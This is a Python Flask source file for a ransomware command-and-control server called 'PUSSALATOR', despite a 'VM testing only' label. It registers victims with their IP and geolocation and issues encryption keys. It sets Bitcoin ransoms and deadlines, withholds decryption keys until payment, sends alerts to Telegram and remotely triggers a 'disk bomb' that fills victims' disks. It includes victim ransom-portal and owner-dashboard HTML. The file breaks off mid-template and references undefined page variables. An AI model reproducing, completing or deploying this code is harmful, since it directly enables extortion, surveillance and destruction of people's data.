#!/usr/bin/env python3
"""
PUSSALATOR - Supabase Backend
FOR VM TESTING ONLY
"""

import os
import json
import random
import string
import hashlib
from datetime import datetime, timedelta
from functools import wraps
from typing import Optional, Dict, Any

from flask import Flask, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from supabase import create_client, Client
import requests

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'pussalator-secret-key-change-this'
    
    # Supabase credentials
    SUPABASE_URL = os.environ.get('SUPABASE_URL') or 'https://your-project.supabase.co'
    SUPABASE_KEY = os.environ.get('SUPABASE_KEY') or 'your-supabase-anon-key'
    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY') or 'your-service-role-key'
    
    # Ransom settings
    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT') or '0.5 BTC'
    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS') or '1PussWalletVMTest'
    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS') or 72)
    
    # Owner credentials - CHANGE THIS!
    OWNER_ID = os.environ.get('OWNER_ID') or '40671Mps19*'
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD') or 'pussalator123'
    
    # Telegram (optional)
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN') or ''
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID') or ''
    
    # Server settings
    DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
    HOST = '0.0.0.0'
    PORT = int(os.environ.get('PORT', 5000))

# ============================================================================
# FLASK APP INIT
# ============================================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
CORS(app)

# ============================================================================
# SUPABASE CLIENT
# ============================================================================

supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_victim_id() -> str:
    """Generate random victim ID"""
    chars = string.ascii_uppercase + string.digits
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_part = ''.join(random.choices(chars, k=8))
    return f"VIC-{timestamp}-{random_part}"

def generate_encryption_key() -> str:
    """Generate encryption key"""
    from cryptography.fernet import Fernet
    return Fernet.generate_key().decode()

def log_action(action: str, details: str, victim_id: str = None):
    """Log system action to Supabase"""
    try:
        supabase_admin.table('system_logs').insert({
            'level': 'INFO',
            'message': f"{action}: {details}",
            'victim_id': victim_id
        }).execute()
    except:
        pass

def get_stats() -> Dict[str, Any]:
    """Get system statistics from Supabase"""
    try:
        # Total victims
        total = supabase_admin.table('victims').select('*', count='exact').execute()
        total_count = len(total.data)
        
        # By status
        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
        
        # Total files
        files_result = supabase_admin.table('victims').select('files').execute()
        total_files = sum(v.get('files', 0) for v in files_result.data)
        
        # Active bombs
        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
        
        # Paid today
        today = datetime.now().date().isoformat()
        paid_today = supabase_admin.table('victims').select('*', count='exact')\
            .eq('status', 'paid')\
            .gte('paid_at', f"{today}T00:00:00")\
            .lte('paid_at', f"{today}T23:59:59")\
            .execute()
        
        return {
            'total': len(total.data),
            'paid': len(paid.data),
            'unpaid': len(unpaid.data),
            'expired': len(expired.data),
            'total_files': total_files,
            'active_bombs': len(active_bombs.data),
            'paid_today': len(paid_today.data)
        }
    except Exception as e:
        print(f"Stats error: {e}")
        return {
            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
        }

# ============================================================================
# AUTHENTICATION DECORATORS
# ============================================================================

def owner_required(f):
    """Decorator for owner-only routes"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('owner_logged_in'):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# ROUTES - PUBLIC PAGES
# ============================================================================

@app.route('/')
def login_page():
    """Main login page"""
    return render_html(LOGIN_PAGE)

@app.route('/victim/<victim_id>')
def victim_page(victim_id):
    """Victim status page"""
    return render_html(VICTIM_PAGE.replace('{{ victim_id }}', victim_id))

@app.route('/owner/dashboard')
@owner_required
def owner_dashboard():
    """Owner dashboard"""
    return render_html(OWNER_DASHBOARD)

def render_html(html_content):
    """Render HTML with proper headers"""
    from flask import make_response
    response = make_response(html_content)
    response.headers['Content-Type'] = 'text/html'
    return response

# ============================================================================
# ROUTES - API (Public)
# ============================================================================

@app.route('/api/stats')
def api_stats():
    """Public stats endpoint"""
    return jsonify(get_stats())

@app.route('/api/victim/<victim_id>')
def api_get_victim(victim_id):
    """Get victim details (public)"""
    try:
        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
        
        if not result.data:
            return jsonify({'error': 'Not found'}), 404
        
        victim = result.data[0]
        
        # Check deadline
        if victim['status'] == 'unpaid' and victim.get('deadline'):
            deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
            if datetime.utcnow() > deadline:
                supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
                victim['status'] = 'expired'
        
        # Don't send key unless paid
        if victim['status'] != 'paid':
            victim['key'] = None
        
        return jsonify(victim)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/add-victim', methods=['POST'])
def api_add_victim():
    """Register new victim (called by client)"""
    try:
        data = request.json
        victim_id = data.get('victim_id') or generate_victim_id()
        
        # Check if exists
        existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
        if existing.data:
            return jsonify({'error': 'Victim exists'}), 400
        
        # Calculate deadline
        deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
        
        # Generate key
        encryption_key = generate_encryption_key()
        
        # Prepare victim data
        victim_data = {
            'id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'created': datetime.utcnow().isoformat(),
            'status': 'unpaid',
            'files': data.get('files', 0),
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS,
            'hostname': data.get('hostname', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'country': data.get('country', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'zip': data.get('zip', 'Unknown'),
            'street': data.get('street', 'Unknown'),
            'lat': data.get('lat', 0.0),
            'lon': data.get('lon', 0.0),
            'isp': data.get('isp', 'Unknown'),
            'org': data.get('organization', 'Unknown'),
            'os': data.get('os', 'Unknown'),
            'bomb_status': 'inactive',
            'bomb_size': 0,
            'tags': ['new']
        }
        
        # Insert into Supabase
        result = supabase_admin.table('victims').insert(victim_data).execute()
        
        # Log
        log_action('new_victim', f'New victim: {victim_id}', victim_id)
        
        # Send Telegram notification if configured
        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
            try:
                msg = f"🔴 NEW VICTIM\nID: {victim_id}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}\nIP: {data.get('ip', '0.0.0.0')}"
                requests.post(
                    f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage",
                    json={'chat_id': Config.TELEGRAM_CHAT_ID, 'text': msg},
                    timeout=3
                )
            except:
                pass
        
        # Prepare response
        response = {
            'victim_id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS
        }
        
        # Add Telegram if configured
        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
            response['telegram_bot_token'] = Config.TELEGRAM_BOT_TOKEN
            response['telegram_chat_id'] = Config.TELEGRAM_CHAT_ID
        
        return jsonify(response), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/update-victim', methods=['POST'])
def api_update_victim():
    """Update victim info"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        files = data.get('files_encrypted')
        
        update_data = {
            'last_seen': datetime.utcnow().isoformat()
        }
        
        if files is not None:
            update_data['files'] = files
        
        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/verify-payment', methods=['POST'])
def api_verify_payment():
    """Verify payment from client"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        tx_id = data.get('tx_id', 'manual_verification')
        
        # Update victim
        supabase_admin.table('victims').update({
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat(),
            'tx': tx_id
        }).eq('id', victim_id).execute()
        
        # Get key
        result = supabase_admin.table('victims').select('key').eq('id', victim_id).execute()
        key = result.data[0]['key'] if result.data else None
        
        log_action('payment', f'Payment for {victim_id}: {tx_id}', victim_id)
        
        return jsonify({'success': True, 'key': key}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# ROUTES - API (Bomb Commands)
# ============================================================================

@app.route('/api/bomb/command/<victim_id>')
def api_get_bomb_command(victim_id):
    """Get pending bomb command"""
    # Check bomb status - in a real implementation you'd have a commands table
    # For simplicity, we'll just check the victim's bomb_status
    result = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
    
    if result.data and result.data[0].get('bomb_status') == 'active':
        return jsonify({'action': 'start', 'filename': 'explosion.dat'})
    
    return jsonify({'action': 'none'})

@app.route('/api/bomb/update', methods=['POST'])
def api_bomb_update():
    """Update bomb status"""
    try:
        data = request.json
        victim_id = data.get('client_id')
        size_gb = data.get('size_gb', 0)
        error = data.get('error')
        
        update_data = {}
        
        if error:
            update_data['bomb_status'] = 'error'
            update_data['notes'] = f"Bomb error: {error}"
        else:
            update_data['bomb_size'] = size_gb
        
        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# ROUTES - API (Owner Only)
# ============================================================================

@app.route('/api/owner/login', methods=['POST'])
def api_owner_login():
    """Owner login API"""
    data = request.json
    owner_id = data.get('owner_id')
    password = data.get('password')
    
    if owner_id == Config.OWNER_ID and password == Config.OWNER_PASSWORD:
        session['owner_logged_in'] = True
        session.permanent = True
        log_action('owner_login', 'Owner logged in')
        return jsonify({'success': True})
    
    return jsonify({'success': False}), 401

@app.route('/api/owner/logout', methods=['POST'])
def api_owner_logout():
    """Owner logout"""
    session.pop('owner_logged_in', None)
    return jsonify({'success': True})

@app.route('/api/owner/victims')
@owner_required
def api_owner_victims():
    """Get all victims (owner only)"""
    try:
        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
        return jsonify(result.data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/victim/<victim_id>')
@owner_required
def api_owner_victim(victim_id):
    """Get single victim (owner only)"""
    try:
        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
        
        if not result.data:
            return jsonify({'error': 'Not found'}), 404
        
        return jsonify(result.data[0])
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/victim/<victim_id>', methods=['PUT'])
@owner_required
def api_owner_update_victim(victim_id):
    """Update victim (owner only)"""
    try:
        data = request.json
        update_data = {}
        
        # Only allow updating specific fields
        allowed_fields = ['status', 'ransom', 'wallet', 'notes', 'tags', 'bomb_status']
        
        for field in allowed_fields:
            if field in data:
                update_data[field] = data[field]
        
        if update_data:
            supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
            log_action('update_victim', f'Updated {victim_id}', victim_id)
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/bomb/start', methods=['POST'])
@owner_required
def api_owner_bomb_start():
    """Start bomb on victim"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        
        supabase_admin.table('victims').update({
            'bomb_status': 'active',
            'bomb_size': 0
        }).eq('id', victim_id).execute()
        
        log_action('bomb_start', f'Started bomb on {victim_id}', victim_id)
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/bomb/stop', methods=['POST'])
@owner_required
def api_owner_bomb_stop():
    """Stop bomb on victim"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        
        supabase_admin.table('victims').update({
            'bomb_status': 'stopped'
        }).eq('id', victim_id).execute()
        
        log_action('bomb_stop', f'Stopped bomb on {victim_id}', victim_id)
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/mark-paid/<victim_id>', methods=['POST'])
@owner_required
def api_owner_mark_paid(victim_id):
    """Mark victim as paid"""
    try:
        supabase_admin.table('victims').update({
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat()
        }).eq('id', victim_id).execute()
        
        log_action('mark_paid', f'Marked {victim_id} as paid', victim_id)
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/delete-victim/<victim_id>', methods=['DELETE'])
@owner_required
def api_owner_delete_victim(victim_id):
    """Delete victim (careful!)"""
    try:
        supabase_admin.table('victims').delete().eq('id', victim_id).execute()
        log_action('delete_victim', f'Deleted {victim_id}', victim_id)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/owner/logs')
@owner_required
def api_owner_logs():
    """Get logs"""
    try:
        result = supabase_admin.table('system_logs').select('*').order('time', desc=True).limit(100).execute()
        return jsonify(result.data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# HTML TEMPLATES - FIXED: Properly assigned to variables
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 100px auto;
            border: 3px solid #ff0000;
            padding: 40px;
            background: #0a0a0a;
            box-shadow: 0 0 30px #ff0000;
            text-align: center;
        }
        
        h1 {
            font-size: 60px;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            margin-bottom: 20px;
            animation: flicker 2s infinite;
        }
        
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            51% { opacity: 1; }
            60% { opacity: 0.9; }
            100% { opacity: 1; }
        }
        
        .subtitle {
            color: #ff6666;
            margin-bottom: 40px;
            font-size: 18px;
        }
        
        .button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 15px 30px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            width: 250px;
            transition: 0.3s;
        }
        
        .button:hover {
            background: #ff6666;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .victim-button {
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
        }
        
        .victim-button:hover {
            background: #00ff00;
            color: black;
        }
        
        .ascii {
            color: #ff0000;
            font-size: 12px;
            white-space: pre;
            margin: 20px 0;
        }
        
        .stats {
            color: #ff6666;
            margin-top: 30px;
            font-size: 14px;
            min-height: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">
    /\\____/\\    /\\____/\\
   (  o  o  )  (  o  o  )
   (   ==   )  (   ==   )
    (______)    (______)
        </div>
        
        <h1>PUSSALATOR</h1>
        <div class="subtitle">> SYSTEM CONTROL PANEL <</div>
        
        <a href="/victim">
            <button class="button victim-button">VICTIM PORTAL</button>
        </a>
        
        <a href="/owner/login">
            <button class="button">OWNER LOGIN</button>
        </a>
        
        <div class="stats" id="stats">Loading stats...</div>
    </div>

    <script>
        async function loadStats() {
            try {
                const r = await fetch('/api/stats');
                const s = await r.json();
                document.getElementById('stats').innerHTML = 
                    `Victims: ${s.total} | Paid: ${s.paid} | BTC: ${s.btc} | Bombs: ${s.bombs}`;
            } catch(e) {
                document.getElementById('stats').innerHTML = 'Stats temporarily unavailable';
            }
        }
        
        loadStats();
        setInterval(loadStats, 10000);
    </script>
</body>
</html>
"""

VICTIM_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Victim Portal</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            margin: 50px auto;
            border: 3px solid #00ff00;
            padding: 30px;
            background: #0a0a0a;
        }
        
        h1 {
            font-size: 36px;
            color: #00ff00;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .warning {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 20px;
            margin-bottom: 30px;
            color: #ff6666;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        label {
            display: block;
            color: #00ff00;
            margin-bottom: 5px;
        }
        
        input {
            width: 100%;
            padding: 10px;
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        
        button:hover {
            background: #66ff66;
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            min-height: 100px;
        }
        
        .back {
            text-align: center;
            margin-top: 20px;
        }
        
        .back a {
            color: #666666;
            text-decoration: none;
        }
        
        .back a:hover {
            color: #00ff00;
        }
        
        .key-box {
            background: black;
            padding: 15px;
            word-break: break-all;
            font-family: monospace;
            border: 1px solid #00ff00;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 VICTIM PORTAL</h1>
        
        <div class="warning">
            Enter your Client ID to check payment status and get decryption key.
        </div>
        
        <div class="input-group">
            <label>CLIENT ID:</label>
            <input type="text" id="victim_id" placeholder="e.g., DESKTOP-ABC123-20250312-1A2B3C4D">
        </div>
        
        <button onclick="checkVictim()">CHECK STATUS</button>
        
        <div id="result" class="result" style="display:none;"></div>
        
        <div class="back">
            <a href="/">← Back to Main</a>
        </div>
    </div>

    <script>
        async function checkVictim() {
            const id = document.getElementById('victim_id').value.trim();
            if (!id) {
                alert('Enter Client ID');
                return;
            }
            
            const result = document.getElementById('result');
            result.style.display = 'block';
            result.innerHTML = 'Loading...';
            
            try {
                const r = await fetch(`/api/victim/${id}`);
                
                if (r.status === 200) {
                    const v = await r.json();
                    const deadline = new Date(v.deadline).toLocaleString();
                    
                    if (v.status === 'paid') {
                        result.innerHTML = `
                            <h3 style="color: #00ff00;">✅ PAYMENT VERIFIED</h3>
                            <p><strong>Client ID:</strong> ${v.id}</p>
                            <p><strong>Decryption Key:</strong></p>
                            <div class="key-box">${v.key}</div>
                            <p style="color: #ffff00;">Use this key with the recovery tool.</p>
                        `;
                    } else {
                        result.innerHTML = `
                            <h3 style="color: #ff0000;">⏳ PAYMENT PENDING</h3>
                            <p><strong>Client ID:</strong> ${v.id}</p>
                            <p><strong>Files Encrypted:</strong> ${v.files}</p>
                            <p><strong>Ransom:</strong> ${v.ransom}</p>
                            <p><strong>Wallet:</strong> ${v.wallet}</p>
                            <p><strong>Deadline:</strong> ${deadline}</p>
                            <p><strong>Bomb Status:</strong> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}</p>
                            <p style="color: #ffff00;">Send payment to the wallet address above.</p>
                        `;
                    }
                } else {
                    result.innerHTML = '<h3 style="color: #ff0000;">❌ Client ID not found</h3>';
                }
            } catch(e) {
                result.innerHTML = '<h3 style="color: #ff0000;">❌ Error connecting to server</h3>';
            }
        }
    </script>
</body>
</html>
"""

OWNER_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Owner Login</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            margin: 100px auto;
            border: 3px solid #ff0000;
            padding: 30px;
            background: #0a0a0a;
            text-align: center;
        }
        
        h1 {
            font-size: 36px;
            color: #ff0000;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: black;
            border: 1px solid #ff0000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        
        button:hover {
            background: #ff6666;
        }
        
        .error {
            color: #ff6666;
            margin: 10px 0;
            min-height: 20px;
        }
        
        .back {
            margin-top: 20px;
        }
        
        .back a {
            color: #666666;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>👑 OWNER LOGIN</h1>
        
        <div id="error" class="error"></div>
        
        <div class="input-group">
            <input type="password" id="password" placeholder="ENTER PASSWORD" onkeypress="handleKey(event)">
        </div>
        
        <button onclick="login()">LOGIN</button>
        
        <div class="back">
            <a href="/">← Back to Main</a>
        </div>
    </div>

    <script>
        function handleKey(e) {
            if (e.key === 'Enter') login();
        }
        
        async function login() {
            const pwd = document.getElementById('password').value;
            try {
                const r = await fetch('/api/owner/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: pwd})
                });
                const d = await r.json();
                
                if (d.success) {
                    window.location.href = '/owner/dashboard';
                } else {
                    document.getElementById('error').innerHTML = '❌ Invalid password';
                    document.getElementById('password').value = '';
                }
            } catch(e) {
                document.getElementById('error').innerHTML = '❌ Connection error';
            }
        }
    </script>
</body>
</html>
"""

OWNER_DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Dashboard</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #ff0000;
            font-size: 36px;
            margin: 0;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            border: 2px solid #ff0000;
            padding: 20px;
            text-align: center;
            background: #1a0000;
            min-height: 80px;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #ff0000;
        }
        
        .stat-label {
            color: #ff6666;
            font-size: 12px;
        }
        
        .panel {
            border: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 20px;
            background: #1a1a1a;
        }
        
        .panel h3 {
            color: #ff0000;
            margin-top: 0;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
        }
        
        .bomb-control {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        input, select {
            background: black;
            border: 1px solid #ff0000;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
            flex: 1;
            min-width: 200px;
            box-sizing: border-box;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        
        button:hover {
            background: #ff6666;
        }
        
        .danger {
            background: black;
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        
        .danger:hover {
            background: #ff0000;
            color: black;
        }
        
        .table-container {
            overflow-x: auto;
            min-height: 200px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: #ff0000;
            color: black;
            padding: 10px;
            position: sticky;
            top: 0;
        }
        
        td {
            border: 1px solid #ff0000;
            padding: 8px;
        }
        
        .status-paid {
            color: #00ff00;
            font-weight: bold;
        }
        
        .status-unpaid {
            color: #ff0000;
            font-weight: bold;
        }
        
        .status-active {
            color: #ffaa00;
            font-weight: bold;
        }
        
        .progress-bar {
            width: 100px;
            height: 20px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
        }
        
        .progress-fill {
            height: 100%;
            background: #ff0000;
        }
        
        .logs {
            height: 200px;
            overflow-y: auto;
            background: black;
            border: 1px solid #ff0000;
            padding: 10px;
            font-size: 12px;
        }
        
        .logout-btn {
            background: black;
            color: #ff0000;
            border: 1px solid #ff0000;
            padding: 8px 16px;
            cursor: pointer;
        }
        
        .logout-btn:hover {
            background: #ff0000;
            color: black;
        }
        
        .tabs {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
        }
        
        .tab {
            background: #1a1a1a;
            color: #ff6666;
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid #ff0000;
            border-bottom: none;
            flex: 1;
            text-align: center;
        }
        
        .tab.active {
            background: #ff0000;
            color: black;
            font-weight: bold;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .victim-info {
            margin-bottom: 20px;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
            min-height: 100px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👑 PUSSALATOR DASHBOARD</h1>
            <div>
                <span id="timestamp" style="color: #666666; margin-right: 20px;"></span>
                <button class="logout-btn" onclick="logout()">LOGOUT</button>
            </div>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">VICTIMS</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">PAID</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">UNPAID</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BTC</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BOMBS</div></div>
        </div>
        
        <div class="tabs">
            <div class="tab active" onclick="showTab('victims')">📋 VICTIMS</div>
            <div class="tab" onclick="showTab('bombs')">💣 BOMB CONTROL</div>
            <div class="tab" onclick="showTab('logs')">📝 LOGS</div>
        </div>
        
        <div id="victims-tab" class="tab-content active">
            <div class="panel">
                <h3>📋 VICTIM LOOKUP</h3>
                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                    <input type="text" id="victim_id" placeholder="Enter Victim ID">
                    <button onclick="getVictim()">GET VICTIM</button>
                    <button class="danger" onclick="deleteVictim()">DELETE</button>
                </div>
                <div id="victim_info" class="victim-info">Enter a Victim ID to view details</div>
            </div>
            
            <div class="panel">
                <h3>📊 ALL VICTIMS</h3>
                <div class="table-container">
                    <table id="victims_table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>FILES</th>
                                <th>LOCATION</th>
                                <th>IP</th>
                                <th>STATUS</th>
                                <th>BOMB</th>
                                <th>DEADLINE</th>
                                <th>ACTIONS</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr><td colspan="8">Loading victims...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div id="bombs-tab" class="tab-content">
            <div class="panel">
                <h3>💣 DISK BOMB CONTROL</h3>
                <div class="bomb-control">
                    <input type="text" id="bomb_client" placeholder="Client ID">
                    <input type="text" id="bomb_file" value="explosion.dat">
                </div>
                <div class="bomb-control">
                    <button onclick="startBomb()">💣 START BOMB</button>
                    <button class="danger" onclick="stopBomb()">🛑 STOP BOMB</button>
                    <button onclick="checkBomb()">📊 CHECK STATUS</button>
                </div>
                <div id="bomb_status" style="margin-top: 20px;"></div>
                <div class="progress-bar" id="bomb_progress" style="display:none;">
                    <div class="progress-fill" id="bomb_fill" style="width:0%"></div>
                </div>
            </div>
            
            <div class="panel">
                <h3>💣 ACTIVE BOMBS</h3>
                <div class="table-container">
                    <table id="bombs_table">
                        <thead>
                            <tr>
                                <th>CLIENT ID</th>
                                <th>SIZE</th>
                                <th>STATUS</th>
                                <th>LAST SEEN</th>
                                <th>ACTION</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr><td colspan="5">No active bombs</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div class="panel">
                <h3>📝 SYSTEM LOGS</h3>
                <div class="logs" id="logs">Loading logs...</div>
            </div>
        </div>
    </div>

    <script>
        let currentTab = 'victims';
        let updateInterval;
        
        function showTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector(`.tab:nth-child(${tab === 'victims' ? 1 : tab === 'bombs' ? 2 : 3})`).classList.add('active');
            document.getElementById(`${tab}-tab`).classList.add('active');
        }
        
        async function loadStats() {
            try {
                const r = await fetch('/api/stats');
                const s = await r.json();
                document.getElementById('stats').innerHTML = `
                    <div class="stat-card"><div class="stat-value">${s.total}</div><div class="stat-label">VICTIMS</div></div>
